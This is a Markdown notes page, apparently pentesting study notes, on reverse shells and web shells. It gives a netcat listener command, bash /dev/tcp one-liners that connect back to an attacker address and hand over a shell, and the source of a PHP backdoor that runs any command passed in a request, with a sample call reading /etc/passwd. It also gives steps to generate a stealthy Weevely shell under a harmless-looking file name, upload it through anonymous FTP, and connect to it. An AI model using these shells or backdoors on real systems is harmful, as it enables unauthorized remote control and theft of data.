<!--
SPDX-FileCopyrightText: 2023 - 2024 Eli Array Minkoff

SPDX-License-Identifier: CC-BY-SA-4.0
-->

# Reverse Shells

<!-- vim-markdown-toc GitLab -->

* [Reverse Shells](#reverse-shells)
  * [Simple Socket Reverse Shells](#simple-socket-reverse-shells)
    * [Attacker Side](#attacker-side)
    * [Target Side](#target-side)
  * [PHP reverse shells](#php-reverse-shells)
  * [Weevely](#weevely)

<!-- vim-markdown-toc -->

## Reverse Shells

### Simple Socket Reverse Shells

Some of the most basic reverse shells simply open a connection to a socket on the attacker's system, then read commands to run from the socket, and write their output back to it. For the examples in this section, I will assume that the attacker is listening on 192.0.2.231 port 5445.

#### Attacker Side

Run `nc -lvnp 5445` for TCP connections, or `nc -lvnup 5445` for UDP connections

**Explanation**: 

* `-l`: listen instead of initiating a connection
* `-v`: verbose output
* `-n`: do not attempt DNS resolution
* `-u`: use a UDP socket, rather than a TCP socket
* `-p 5445`: port 5445

#### Target Side

There is a list available [at this link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) of many different reverse shells in different languages.

I am including a simple one of them (with the example address and port changed), but for a much greater variety, follow the link above.

```bash
bash -i >& /dev/tcp/192.0.2.231/5445 0>&1

0<&196;exec 196<>/dev/tcp/192.0.2.231/5445; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/192.0.2.231/5445 0<&1 2>&1
```

### PHP reverse shells

On Kali systems, you can find a simple PHP reverse shell with the following contents at /usr/share/webshells/php/simple-backdoor.php:

```php
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->

```

For a fancier web shell with a TTY-like user interface, check out [prakashchand72/Interactive-Php-Reverse-shell](https://github.com/prakashchand72/Interactive-Php-Reverse-shell).

### Weevely

Weevely provides a stealthier reverse shell that won't look like a reverse shell in logs. It can be used in a few steps:

```bash
# set the password
read -s -p "Password: " pass
# generate the executable
weevely generate "$pass" inconspicuous-filename.php
# somehow upload the executable to the target server - if there's anonymous read-write FTP access to a path within the web directory, that might work
printf 'cd upload-dir\nput %s\nexit\n' inconspicuous-filename.php | ftp -a targetserver.example
# connect to the weevely shell
weevely http://targetserver.example/upload-dir/inconspicuous-filename.php "$pass"
```
